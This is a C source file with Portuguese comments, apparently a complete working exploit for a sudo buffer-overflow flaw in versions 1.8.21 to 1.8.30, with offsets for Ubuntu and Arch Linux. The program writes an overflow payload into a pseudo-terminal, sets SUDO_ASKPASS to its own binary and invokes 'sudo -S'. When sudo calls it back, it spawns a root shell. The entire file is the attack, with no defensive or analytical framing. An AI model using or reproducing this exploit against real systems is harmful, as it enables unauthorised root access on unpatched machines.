#define _GNU_SOURCE
#include <assert.h>
#include <err.h>
#include <fcntl.h>
#include <limits.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdlib.h>
#include <termios.h>
#include <unistd.h>

#define TGP_ASKPASS 0x4
#define SUDO_CONV_REPL_MAX 255

/* sudo 1.8.30-1 */
#define TGP_OFFSET_ARCHLINUX 548
/* sudo 1.8.21p2-3ubuntu1 (bionic 18.04) */
/* sudo 1.8.29-1ubuntu1 (focal 20.04) */
#define TGP_OFFSET_UBUNTU 624

#define KILL_OFFSET (SUDO_CONV_REPL_MAX - 1)
#define OVERFLOW_SIZE 1000
#define TGP_OFFSET TGP_OFFSET_UBUNTU

int main(int argc, char **argv) {
    (void)argv;

    // Se o programa foi chamado com argumentos, assume que foi invocado pelo Sudo.
    if (argc > 1) {
        // Remove a variável de ambiente SUDO_ASKPASS, se existir.
        if (unsetenv("SUDO_ASKPASS") != 0) {
            warn("unsetenv(SUDO_ASKPASS)");
        }
        // Restaura stdin e stdout para a saída de erro.
        if (dup2(STDERR_FILENO, STDIN_FILENO) != STDIN_FILENO) {
            warn("dup2(STDERR_FILENO, STDIN_FILENO)");
        }
        if (dup2(STDERR_FILENO, STDOUT_FILENO) != STDOUT_FILENO) {
            warn("dup2(STDERR_FILENO, STDOUT_FILENO)");
        }
        // Executa um shell, pois estamos agora como askpass.
        execlp("sh", "sh", NULL);
        err(1, "execlp(sh)");
    }

    // Abre um pseudo-terminal.
    int ptyfd = posix_openpt(O_NOCTTY | O_RDWR);
    if (ptyfd < 0) {
        err(1, "posix_openpt");
    }
    // Concede permissões para o pty.
    if (grantpt(ptyfd) != 0) {
        err(1, "grantpt");
    }
    // Desbloqueia o pty.
    if (unlockpt(ptyfd) != 0) {
        err(1, "unlockpt");
    }

    struct termios term;
    // Obtém os atributos do terminal do pty.
    if (tcgetattr(ptyfd, &term) != 0) {
        err(1, "tcgetattr");
    }

    // Configura o terminal em modo "raw", para não processar a entrada.
    cfmakeraw(&term);
    // Muda o caractere EOF para um valor não usado (0xAA).
    term.c_cc[VEOF] = 0xAA;

    // Define os atributos do terminal com as novas configurações.
    if (tcsetattr(ptyfd, TCSANOW, &term) != 0) {
        err(1, "tcsetattr");
    }

    // Verificações para garantir que os caracteres não causem problemas.
    uint8_t sudo_term_eof = term.c_cc[VEOF];
    if (sudo_term_eof == 0 || sudo_term_eof == TGP_ASKPASS) {
        errx(1, "sudo_term_eof = %u", sudo_term_eof);
    }
    uint8_t sudo_term_erase = term.c_cc[VERASE];
    if (sudo_term_erase == 0 || sudo_term_erase == TGP_ASKPASS) {
        errx(1, "sudo_term_erase = %u", sudo_term_erase);
    }
    uint8_t sudo_term_kill = term.c_cc[VKILL];
    if (sudo_term_kill == 0 || sudo_term_kill == TGP_ASKPASS) {
        errx(1, "sudo_term_kill = %u", sudo_term_kill);
    }

    // Obtém o nome do dispositivo associado ao pty.
    const char *devpts = ptsname(ptyfd);
    if (devpts == NULL) {
        err(1, "ptsname");
    }

    // Abre o pty como somente leitura.
    int ttyfd = open(devpts, O_NOCTTY | O_RDONLY);
    if (ttyfd < 0) {
        err(1, "open(devpts)");
    }

    // Prepara o payload para explorar a vulnerabilidade.
    uint8_t payload[OVERFLOW_SIZE + 5] = {0};
    payload[KILL_OFFSET * 1] = sudo_term_kill;
    payload[KILL_OFFSET * 2] = sudo_term_kill;
    
    // Ajusta o payload para a exploração.
    static_assert(TGP_OFFSET + 2 > KILL_OFFSET * 2, "TGP_OFFSET invalid");
    static_assert(TGP_OFFSET + 2 < KILL_OFFSET * 3, "TGP_OFFSET invalid");
    payload[TGP_OFFSET + 2] = TGP_ASKPASS;
    payload[KILL_OFFSET * 3] = sudo_term_kill;
    payload[sizeof(payload) - 2] = sudo_term_kill;
    payload[sizeof(payload) - 1] = '\n';

    // Escreve o payload no pty.
    if (write(ptyfd, payload, sizeof(payload)) != sizeof(payload)) {
        err(1, "write(ptyfd, payload)");
    }

    // Substitui stdin pelo nosso pseudo-terminal para que Sudo o utilize.
    if (dup2(ttyfd, STDIN_FILENO) != STDIN_FILENO) {
        err(1, "dup2(ttyfd, STDIN_FILENO)");
    }
    if (close(ttyfd) != 0) {
        warn("close(ttyfd)");
    }

    // Lê o caminho absoluto do executável atual.
    char askpass[PATH_MAX + 1];
    ssize_t len = readlink("/proc/self/exe", askpass, sizeof(askpass) - 1);
    if (len < 0) {
        err(1, "readlink(/proc/self/exe)");
    }
    askpass[len] = '\0';

    // Define SUDO_ASKPASS, mas não fornece -A ao Sudo.
    if (setenv("SUDO_ASKPASS", askpass, true) != 0) {
        err(1, "setenv(SUDO_ASKPASS)");
    }

    // Executa o sudo com a entrada do pseudo-terminal.
    execlp("sudo", "sudo", "-S", "", NULL);
    err(1, "execlp(sudo)");
}

